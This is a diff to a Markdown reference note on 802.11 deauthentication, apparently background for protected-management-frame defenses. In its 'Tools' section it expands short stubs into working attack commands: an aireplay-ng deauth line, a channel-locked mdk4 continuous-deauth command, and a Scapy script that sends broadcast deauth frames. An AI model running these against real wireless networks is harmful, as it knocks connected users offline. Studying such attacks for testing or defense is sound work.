@@ -46,9 +46,28 @@ Under 802.11w PMF (802.11-2020 §11.34):
 ## Tools
 
 - `aireplay-ng -0 <count> -a <bssid> [-c <client>] <iface>` — the classic
-- `mdk4 <iface> d -B <bssid>` — mdk4 mode d
-- Scapy: `Dot11(type=0, subtype=12, addr1=..., addr2=..., addr3=...) /
-  Dot11Deauth(reason=7)`
+- mdk4 mode d, channel-locked + explicit rate:
+
+  ```
+  # Channel-locked deauth (b mode won't work here — use d for continuous
+  # deauth or e for a fake-auth flood).
+  mdk4 wlan1mon d -c 6 -b <ssid_or_bssid_list> -s 100
+  # -c 6         lock to channel 6
+  # -s 100       100 pps (default; explicit is safer)
+  ```
+
+- Scapy — wrap in RadioTap and note the radio must be in monitor mode:
+
+  ```python
+  from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
+  frame = RadioTap() / Dot11(
+      type=0, subtype=12,
+      addr1="ff:ff:ff:ff:ff:ff",
+      addr2=AP_BSSID,
+      addr3=AP_BSSID,
+  ) / Dot11Deauth(reason=7)
+  sendp(frame, iface="wlan1mon", count=64, inter=0.05)
+  ```
 
 ## Cite
 
